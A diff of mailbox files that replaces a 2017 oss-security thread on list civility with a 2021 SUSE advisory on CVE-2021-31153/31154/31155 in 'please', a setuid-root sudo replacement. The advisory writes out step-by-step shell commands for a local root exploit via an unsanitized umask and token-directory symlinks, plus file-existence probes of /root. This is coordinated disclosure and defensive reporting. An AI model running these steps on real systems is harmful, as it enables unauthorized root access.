@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2966" "Monday" "26" "June" "2017" "22:31:14" "+0000" "Kyle R" "Kyle.R@CriticalInformatics.com" "<MWHPR04MB1086792B34233BB68DEE393184DF0@MWHPR04MB1086.namprd04.prod.outlook.com>" "76" "Re: [oss-security] civilized discussion (Re: More CONFIG_VMAP_STACK vulnerabilities, refcount_t UAF, and an ignored Secure Boot bypass / rootkit method)" "^Date:" nil nil "6" "2017062622:31:14" "[oss-security] civilized discussion (Re: More CONFIG_VMAP_STACK vulnerabilities, refcount_t UAF, and an ignored Secure Boot bypass / rootkit method)" (number mark "        Kyle.R@Criti Jun 26   76/2966  " thread-indent "\"Re: [oss-security] civilized discussion (Re: More CONFIG_VMAP_STACK vulnerabilities, refcount_t UAF, and an ignored Secure Boot bypass / rootkit method)\"\n") "<6AE321DE-812B-4EA1-807F-3C36B6E077D0@redhat.com>" ("<20170624005003.GB27479@grsecurity.net>" "<CAADWXX8JYe-AewtzoY6VBVLPTs+UvnfZst76vL4tccf6x9cY=g@mail.gmail.com>" "<20170624151504.GA25902@grsecurity.net>" "<CA+55aFyZpWutYKccn1eZBV5Lj_bF7gEZqy=LgjDOBqHk4poeTA@mail.gmail.com>" "<20170625013537.GA21637@grsecurity.net>" "<CALogXGW++8_OVkE_hyREa_fYjK1eDkinZQfBDVYVJ=vA0Nw-dg@mail.gmail.com>" "<20170626205012.GA17038@openwall.com>" "<6AE321DE-812B-4EA1-807F-3C36B6E077D0@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["9706" "Tuesday" "18" "May" "2021" "12:15:53" "+0200" "Matthias Gerstner" "mgerstner@suse.de" nil "260" "[oss-security] please: CVE-2021-31153,CVE-2021-31154,CVE-2021-31155: local root exploit and further security issues in sudo-like utility" nil nil nil "5" nil nil (number mark "U       mgerstner@su May 18  260/9706  " thread-indent "\"[oss-security] please: CVE-2021-31153,CVE-2021-31154,CVE-2021-31155: local root exploit and further security issues in sudo-like utility\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] please: CVE-2021-31153,CVE-2021-31154,CVE-2021-31155: local root exploit and further security issues in sudo-like utility" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 14197 invoked by uid 550); 27 Jun 2017 12:42:15 -0000
+Received: (qmail 24549 invoked by uid 550); 18 May 2021 10:16:06 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,135 +11,277 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 7415 invoked from network); 26 Jun 2017 22:31:27 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=MKHamiltonAssociates.onmicrosoft.com; s=selector1-CriticalInformatics-com;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version;
- bh=7Ps6RYVWHj/47FyS4zxjBi9DKjyirLDyQTT2gfNZn+M=;
- b=UYYEls+cR2kENUWs9UVTwb+WTCiXL0u1v/ouk+yw+SSGZFH5c0Hfg9EQIa7zEAmtPsosLKY6bcziIisbrW68r8nPykensMff54WJyqwV1LLcZAPMZYvO8NRcJ0ghQ8vFrb2OiRL73hbae76NlTKEB3lPZb5WMWy74kPONzyDDVw=
-Thread-Topic: [oss-security] civilized discussion (Re: More CONFIG_VMAP_STACK
- vulnerabilities, refcount_t UAF, and an ignored Secure Boot bypass / rootkit
- method)
-Thread-Index: AQHS7r5OX7v8F84lOkG+84n86/DgxaI3qFYAgAARx7U=
-Message-ID: <MWHPR04MB1086792B34233BB68DEE393184DF0@MWHPR04MB1086.namprd04.prod.outlook.com>
-References: <20170624005003.GB27479@grsecurity.net>
- <CAADWXX8JYe-AewtzoY6VBVLPTs+UvnfZst76vL4tccf6x9cY=g@mail.gmail.com>
- <20170624151504.GA25902@grsecurity.net>
- <CA+55aFyZpWutYKccn1eZBV5Lj_bF7gEZqy=LgjDOBqHk4poeTA@mail.gmail.com>
- <20170625013537.GA21637@grsecurity.net>
- <CALogXGW++8_OVkE_hyREa_fYjK1eDkinZQfBDVYVJ=vA0Nw-dg@mail.gmail.com>
- <20170626205012.GA17038@openwall.com>,<6AE321DE-812B-4EA1-807F-3C36B6E077D0@redhat.com>
-In-Reply-To: <6AE321DE-812B-4EA1-807F-3C36B6E077D0@redhat.com>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
-authentication-results: lists.openwall.com; dkim=none (message not signed)
- header.d=none;lists.openwall.com; dmarc=none action=none
- header.from=CriticalInformatics.com;
-x-originating-ip: [207.14.32.187]
-x-ms-publictraffictype: Email
-x-microsoft-exchange-diagnostics: 1;MWHPR04MB1088;7:GkRtI3Q54sWV9Rkt5hAdhOet1ojKHgZ+gaXlJVqyO77OdQPCN38hpDLjtPK/ulc3yWEJb/6GsTQZekcrwLnW+IsOn3SX5i8DJcXqetnpsZqi4oQZqramU8RKQuGP52gw7HJOo5MnPM3sfSzWsMN6NxrKyqcLpKlj1+PmZrjrqsoEEwPAwqnmeA7Tru9Rd3qU+9VY3G10O3z1l1JfTtJA3me4BMFwuRSrn0/IHbTBJwkHrdTlHiBoY3ykKR5hJvq1Z7qpEmG61c6zHdWBwN/Wak0vjIDrYGrFOcDYyafs1CLMOjmzCi6qNWjnYrna60j+rfAp8Qpq64sCSra7ETdv2w8Uv8/7NN1w9InO7VpY6qOAPdfOHSsa5YxZw909QFPHt+EpvrDdqzkWpKvjcUj7+rz0LLXFK4JU0ERBSMQE/1ahNFp1mRx7+spU0pY05ZaBUmJbzymJ7dzxSnyVFGFcODPburLBgQl/uRLfyf8ekf8crIURIt1q2ACEDmlLejfl/KDlTcGyN4WkIHB1IXymeee+RhDqCiN9zasMSQlowtk9igTVGXM16YI4d3PI6JTzFfblwoy34eNqp6zlhoKPYlrwx3p721aCJh1gFmaLMwPRdWs4MG/AYok8Ba0lFu8x/tsqyaSDTPL2jmwUDF6Gx/K34oj9Lh5UOqIPg+8x322GtP3qaMEbwFonFE+llJooqq4UVO2vMEeLUTNNWlMSvRpo5Dn3JkxZC2FK6/1p2AQ2aIopBUxhAUiI4Eak6VtWzYqz+yXv61letmoRgR3qMa9lJCMzMk83QSyOrAvzVls=
-x-ms-office365-filtering-correlation-id: e42c2006-4b00-47e9-ddde-08d4bce30e2f
-x-microsoft-antispam: UriScan:;BCL:0;PCL:0;RULEID:(300000500095)(300135000095)(300000501095)(300135300095)(22001)(300000502095)(300135100095)(2017030254075)(300000503095)(300135400095)(201703131423075)(300000504095)(300135200095)(300000505095)(300135600095);SRVR:MWHPR04MB1088;
-x-ms-traffictypediagnostic: MWHPR04MB1088:
-x-microsoft-antispam-prvs: <MWHPR04MB1088CC78C4B73DAD5C7032C984DF0@MWHPR04MB1088.namprd04.prod.outlook.com>
-x-exchange-antispam-report-test: UriScan:(125551606395959)(158342451672863)(26388249023172)(236129657087228)(192374486261705)(48057245064654)(247924648384137);
-x-exchange-antispam-report-cfa-test: BCL:0;PCL:0;RULEID:(100000700101)(100105000095)(100000701101)(100105300095)(100000702101)(100105100095)(6040450)(601004)(2401047)(5005006)(8121501046)(3002001)(93006095)(93001095)(10201501046)(100000703101)(100105400095)(6041248)(20161123562025)(20161123564025)(20161123558100)(201703131423075)(201702281528075)(201703061421075)(201703061406153)(20161123560025)(2016111802025)(20161123555025)(6072148)(6043046)(100000704101)(100105200095)(100000705101)(100105500095);SRVR:MWHPR04MB1088;BCL:0;PCL:0;RULEID:(100000800101)(100110000095)(100000801101)(100110300095)(100000802101)(100110100095)(100000803101)(100110400095)(100000804101)(100110200095)(100000805101)(100110500095);SRVR:MWHPR04MB1088;
-x-forefront-prvs: 0350D7A55D
-x-forefront-antispam-report: SFV:NSPM;SFS:(10009020)(6009001)(39850400002)(39400400002)(39410400002)(39450400003)(24454002)(377454003)(53754006)(5660300001)(2906002)(81166006)(3280700002)(3660700001)(2351001)(7696004)(8676002)(74316002)(3846002)(6116002)(102836003)(86362001)(33656002)(53936002)(8936002)(9686003)(54896002)(77096006)(7736002)(6916009)(55016002)(38730400002)(2900100001)(2950100002)(6246003)(110136004)(6506006)(229853002)(53546010)(66066001)(6436002)(5640700003)(2501003)(25786009)(72206003)(189998001)(15650500001)(76176999)(50986999)(14454004)(99286003)(122556002)(54356999)(478600001)(85282002);DIR:OUT;SFP:1101;SCL:1;SRVR:MWHPR04MB1088;H:MWHPR04MB1086.namprd04.prod.outlook.com;FPR:;SPF:None;MLV:sfv;LANG:en;
-spamdiagnosticoutput: 1:99
-spamdiagnosticmetadata: NSPM
-Content-Type: multipart/alternative;
-	boundary="_000_MWHPR04MB1086792B34233BB68DEE393184DF0MWHPR04MB1086namp_"
-MIME-Version: 1.0
-X-OriginatorOrg: CriticalInformatics.com
-X-MS-Exchange-CrossTenant-originalarrivaltime: 26 Jun 2017 22:31:14.4406
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: ae101de8-a5dc-4a52-a8be-3a9dbc6674b4
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: MWHPR04MB1088
-Date: Mon, 26 Jun 2017 22:31:14 +0000
-From: Kyle R <Kyle.R@CriticalInformatics.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] civilized discussion (Re: More CONFIG_VMAP_STACK
- vulnerabilities, refcount_t UAF, and an ignored Secure Boot bypass / rootkit
- method)
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
+Received: (qmail 24530 invoked from network); 18 May 2021 10:16:05 -0000
+X-Virus-Scanned: by amavisd-new at test-mx.suse.de
+Date: Tue, 18 May 2021 12:15:53 +0200
+From: Matthias Gerstner <mgerstner@suse.de>
+To: oss-security@lists.openwall.com
+Message-ID: <YKOT2W06Zbh45EJw@f195.suse.de>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="4S3/PEyenh29+g1C"
+Content-Disposition: inline
+Subject: [oss-security] please: CVE-2021-31153,CVE-2021-31154,CVE-2021-31155: local root
+ exploit and further security issues in sudo-like utility
 
---_000_MWHPR04MB1086792B34233BB68DEE393184DF0MWHPR04MB1086namp_
-Content-Type: text/plain; charset="us-ascii"
+--4S3/PEyenh29+g1C
+Content-Type: text/plain; charset=iso-8859-1
+Content-Disposition: inline
 Content-Transfer-Encoding: quoted-printable
 
-+1 for Solar always having a level-head when moderating this list.
+Hello list,
 
-________________________________
-From: Kurt Seifried <kseifrie@redhat.com>
-Sent: Monday, June 26, 2017 2:26:46 PM
-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] civilized discussion (Re: More CONFIG_VMAP_STAC=
-K vulnerabilities, refcount_t UAF, and an ignored Secure Boot bypass / root=
-kit method)
+"please" [1] is a sudo replacement written in Rust. Its author requested
+a code review for inclusion of the setuid-root binary in openSUSE [2].
 
-To be clear solar has always been a sane and polite person, but I don't kno=
-w what the list policy is, in part because I don't think this has really co=
-me up before(that I can remember).
+I reviewed the source of please version 0.3.3 and found multiple
+security issues including a local root exploit (item 1.d) for users that
+are allowed to run a command. You can find the detailed report below.
 
+# 1) Findings in `please`
 
--Kurt
+## a) Arbitrary File Existence Test and Arbitrary File Open via `-c`, `--ch=
+eck`
 
+  Arbitrary file existence test and arbitrary file open as root is possible
+  via the `-c`, `--check` command line switch. This does not involve an
+  information leak but triggers kernel logic not usually available to regul=
+ar
+  users e.g. when sockets or special devices are involved. It also allows t=
+he
+  setuid-root program to run out-of-memory. Examples:
 
+  ```
+  # runs OOM
+  user$ please -c /dev/zero
+  Killed
 
+  # reads the full block device until OOM occurs
+  user$ please -c /dev/sda
+  Killed
 
+  # this file exists (in my case)
+  user$ please -c /root/.bash_history
+  Error parsing /root/.bash_history:712
+  Error parsing /root/.bash_history:716
+  Error parsing /root/.bash_history:1380
+  Error parsing /root/.bash_history:1382
+  # this doesn't exist
+  user$ please -c /root/.something
+  ```
 
-> On Jun 26, 2017, at 14:50, Solar Designer <solar@openwall.com> wrote:
->
-> Hi all,
->
-> Yes, I too would like the discussions in here to stay civilized.
->
-> Brad wrote to Linus:
->
->> On Sat, Jun 24, 2017 at 9:35 PM, Brad Spengler <spender@grsecurity.net> =
-wrote:
->> With no technical content coming from your end, there's no need to discu=
-ss
->> anything further -- don't waste your time because I won't reply.
->
-> and I hope that Linus won't reply (as far as I can see, he did not so
-> far) and this does in fact end that thread.
->
->> On Mon, Jun 26, 2017 at 03:16:06PM -0400, Mansour Moufid wrote:
->> Is there another mailing list for discussions of Linux security? Or foru=
-m?
->
-> At Openwall, we also host the kernel-hardening mailing list, but we
-> currently moderate it similarly - that is, we're not preventing
-> occasional/infrequent threads like this right away, letting a sensible
-> number of messages to pass through, even if with insults and such.
-> Usually those threads end on their own.  In fact, I only recall one very
-> recent thread in there where I intervened and technically shut it down.
-> If the pro-grsecurity and/or anti-grsecurity folks try much harder,
-> we'll probably have to start moderating the lists much stricter.
->
-> There are probably other suitable mailing lists and forums as well.
-> Maybe someone else would share some.
->
->> I have been thinking of sharing a few patches for the last couple months.
->> I don't think this is the right place after the kind of insults I saw th=
-is week.
->
-> This sounds weird to me: you've been sitting on those patches for "the
-> last couple months" and now a thread "this week" finally made you decide
-> not to post them in here.  Anyhow, if those patches would be on-topic in
-> here or on kernel-hardening, please feel free to reconsider.
->
-> Off-list, someone else also explained to me that the recent dirt in here
-> discouraged them from posting certain reasonable content.  So this is
-> probably happening, and that's a pity.  I ask that anyone who thinks
-> they have higher quality content than what we see in this thread does
-> post that.  Let this be your response.
->
-> Alexander
+  The file existence test allows for a minimal information leak in terms of
+  the involved line numbers output in the error messages.
 
---_000_MWHPR04MB1086792B34233BB68DEE393184DF0MWHPR04MB1086namp_--
+## b) Arbitrary File Existence Test via the `search_path()` function
+
+  Arbitrary file existence test is possible via the `search_path()` functio=
+n,
+  called in please.rs:254. Examples:
+
+  ```
+  # this file doesn't exist
+  user$ please /root/.something
+  [please]: command not found
+
+  # this file exists (in my case)
+  user$ please /root/.bash_history
+  You may not execute "/root/.bash_history" on <host> as root
+  ```
+
+## c) Arbitrary file existence test via the `-d` switch
+
+  This one also allows differentiation between dirs and files.
+
+  ```
+  # here /root/.gnupg exists and is a directory
+  user$ please -d /root/.gnupg cat /etc/fstab
+  [<fstab content>]
+
+  # here /root/.bash_history exists but is not a directory
+  user$ please -d /root/.bash_history cat /etc/fstab
+  Cannot cd into /root/.bash_history: Not a directory (os error 20)
+
+  # here /root/.something does not exist at all
+  user$  please -d /root/.something  cat /etc/fstab
+  Cannot cd into /root/.something: No such file or directory (os error 2)
+  ```
+
+## d) The Token Dir "/var/run/pleaser/token" is Created with Unsanitized um=
+ask
+
+  The token dir "/var/run/pleaser/token", if not existing, is created via
+  Rust's `create_dir_all` and the process's umask is not sanitized. This
+  allows the unprivileged user to influence the resulting directory
+  permissions:
+
+  ```
+  # the directory must not yet exist. If it does, a reboot can help out.
+  test -d /var/run/please && echo "token dir already exists, won't work!"
+  # clear umask
+  user$ umask 0
+
+  # run some arbitrary command, this needs to be allowed via /etc/please.ini
+  # but whether the password is successfully entered or not is unimportant
+  # at this point.
+  user$ please cat /etc/fstab
+  [please] password for user: ^C
+
+  # now the directories should have been created world-writable
+  user$ ls -lhd /var/run/please /var/run/please/token
+  drwxrwxrwx 3 root root 60 31. M=E4r 13:48 /var/run/please/
+  drwxrwxrwx 2 root root 40 31. M=E4r 13:48 /var/run/please/token
+
+  # now to grant us access to arbitrary configured commands w/o entering the
+  # user password
+  user$ touch /var/run/please/token/$USER:`tty | tr '/' '_'`:$$
+
+  # should now work w/o password
+  user$ please cat /etc/fstab
+  [<fstab content>]
+
+  # since symlinks are also followed in the token directory we can now crea=
+te
+  # new world-writable files anywhere in the system after authentication
+  # succeeds. Already existing files can be truncated to size 0 this way.
+  user$ cd /var/run/please/token
+  user$ rm -f $USER:*
+  user$ ln -s /etc/tmpfiles.d/supersafe.conf $USER:`tty | tr '/' '_'`:$$
+  user$ please cat /etc/fstab
+  [please] password for user: <actual password>
+
+  # the file should now have been created world-writable
+  user$ ls -l /etc/tmpfiles.d/supersafe.conf
+  -rw-rw-rw- 1 root root 0 31. M=E4r 13:57 /etc/tmpfiles.d/supersafe.conf
+  # write some interesting content in there
+  user$ echo "d /root 0777 root root -" >/etc/tmpfiles.d/supersafe.conf
+  # reboot the local system e.g. via power button or display manager, then.=
+..
+  user$ ls -lhd /root
+  drwxrwxrwx 10 root root 4.0K 31. M=E4r 13:46 /root/
+  ```
+
+  So this more or less allows anybody who is allowed to execute at least one
+  command with password authentication to perform a full local root exploit.
+
+## 2) Findings in `pleaseedit`
+
+## a) Predictable Temporary File Names in /tmp and the Target Directory
+
+  pleaseedit uses predictable paths in /tmp and in the target directory via
+  the functions `tmp_edit_file_name()` and `source_tmp_file_name()` and
+  possibly others. Without the Linux kernel's symlink protection this would
+  allow arbitrary file overwrite and ownership change if a regular user is
+  allowed to edit any file via pleaseedit.
+
+  Here is an excerpt of system calls performed in /tmp when editing /etc/fs=
+tab
+  successfully:
+
+  ```
+  statx(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", AT_STATX_SYNC_AS_STAT,=
+ TA_ALL, 0x7fff21e4cd60) =3D -1 ENOENT (No such file or directory)
+  openat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", _WNLY|O_CREAT|O_TRUNC=
+|O_CLOEXEC, 0100600) =3D 4
+  chown("/tmp/pleaseedit.user._etc_fstab", 1000, 100) =3D 0
+  fchmodat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", 0600) =3D 0
+  execve("/usr/bin/cat", ["/usr/bin/cat", "/tmp/pleaseedit.user._etc_m"...]=
+, x55afc490f0 /* 74 vars */) =3D 0
+  openat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", O_RDONLY) =3D 3
+  openat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", O_RDONLY|O_CLOEXEC) =
+=3D 3
+  unlink("/tmp/pleaseedit.user._etc_fstab") =3D 0
+  ```
+
+  So the `openat()` calls do not include the `O_NOFOLLOW` flag to explicitly
+  protect against symlinks existing there. Furthermore these paths should
+  really be unpredictable in an `mkstemp()` manner.
+
+  The `chown()` call would allow for a full local root exploit if not for t=
+he
+  symlink protection mechanism. A race condition needs to be won, however,
+  because the code tries to remove an existing file in this location first.
+
+  In the target directory `pleaseedit` also potentially follows symlinks:
+
+  ```
+  openat(AT_FDCWD, "/etc/fstab.pleaseedit.copy.user", _WNLY|O_CREAT|O_TRUNC=
+|O_CLOEXEC, 0100600) =3D 4
+  ```
+
+  So if the target directory is under control of a non-root user then this
+  could also allow privilege escalation, this time there isn't even symlink
+  protection available, because the target directory will not be
+  sticky/world-writable. It requires two user accounts to "work
+  together", however, the user that is invoking `please` and the user
+  that is owning the target directory.
+
+# Bugfixes
+
+I discussed and reviewed fixes for these issues (and for a couple of
+other recommendations I gave) with the upstream author and they are part
+of the v0.4.0 upstream release.
+
+# CVE assignments
+
+- CVE-2021-31153: cummulative for all file and directory existence tests
+  corresponding to findings 1.a, 1.b and 1.c.
+- CVE-2021-31154: for the predictable temporary filenames in pleaseedit
+  corresponding to finding 2.a.
+- CVE-2021-31155: for the missing sanitation of the umask corresponding to
+  finding 1.d.
+
+# Conclusion
+
+Correctly implementing setuid-root binaries remains a challenge also in
+modern programming languages like Rust. While the general design of
+'please' was rather clean it was not implemented setuid aware at all.
+
+# Timeline
+
+2021-03-17: Review request was created
+2021-04-01: I shared the security findings with the upstream author and
+            offered coordinated disclosure.
+2021-04-14: I reviewed the final batch of fixes and we agreed on them.
+2021-05-17: The embargo time frame was unclear for a longer time
+            since Debian Linux updates needed to be prepared, but the
+	    upstream author already published the fixes on Gitlab. I
+	    received the official okay for publishing the full report
+	    only now.
+
+[1]: https://gitlab.com/edneville/please.git
+[2]: https://bugzilla.suse.com/show_bug.cgi?id=3D1183669
+
+--=20
+Matthias Gerstner <matthias.gerstner@suse.de>
+Dipl.-Wirtsch.-Inf. (FH), Security Engineer
+https://www.suse.com/security
+Phone: +49 911 740 53 290
+GPG Key ID: 0x14C405C971923553
+=20
+SUSE Software Solutions Germany GmbH
+HRB 36809, AG N=FCrnberg
+Gesch=E4ftsf=FChrer: Felix Imend=F6rffer
+
+--4S3/PEyenh29+g1C
+Content-Type: application/pgp-signature; name="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmCjk9kACgkQFMQFyXGS
+NVP+Lw//T2+i+b4kDB5CQhpEVoy5Ik0VDDcHGOjL0wlaCUc1lNzqdOduqf5huTpn
+Hi7bdQnEh2FwWs7/mEZvJyJofG/1/PsnRuwaOCfwg8LEPli2bd0At4Gni3vqy2pz
+FDFrleoGCiA5uCkCk2PmoIGrJGFK8xTUkmoEm6nsy9hQn7hzgyYPWZk6xWyFvjLc
+XAjL/w6RIKvz/Kwh/oLCK8UuXVrIDIVlDDjhom37D5IJjPnzBgx3rPOPiDty639s
+3/akpa7kYVZ9lBovO9pFk4aZ9lDuTrOD7IqjcKRHG37Npa64jPSplLt5EvfVbw1W
+HBMP9lYBKQUpeMWbiSVmRS6Qp3rXmQBcX/T2TKx6CML6saYzxsgDOKbVw9P/tL+7
+UA4FQx5UNMAVtUgTs6UUVcuVdbL8sEWJNtysLqZqemN46MxDQGJo3sYQksWm9O5a
+IcyN72boB9yoKwv3Kqlta1YthfRFDIPJAQ1ljyV3nZDvhhJSQVlYzG1zayqtdIN2
+zP9MZ/63jaMkn3OqS5jdEay6F+6rM8EwXuWEdOfXDfy4KTAH9We0vVSaGipYFX7V
+Tao68A4vzDgGNz8LfD2eOmA/Iz62LD4K9ycIaMl/EAB4gcxNWcxSejEA1dmV+4lw
+QWmgS0jQTr/v8qp45TL1Mvr4Il5KXODyG5x7rWo77U3dOdmV/y8=
+=FeP1
+-----END PGP SIGNATURE-----
+
+--4S3/PEyenh29+g1C--
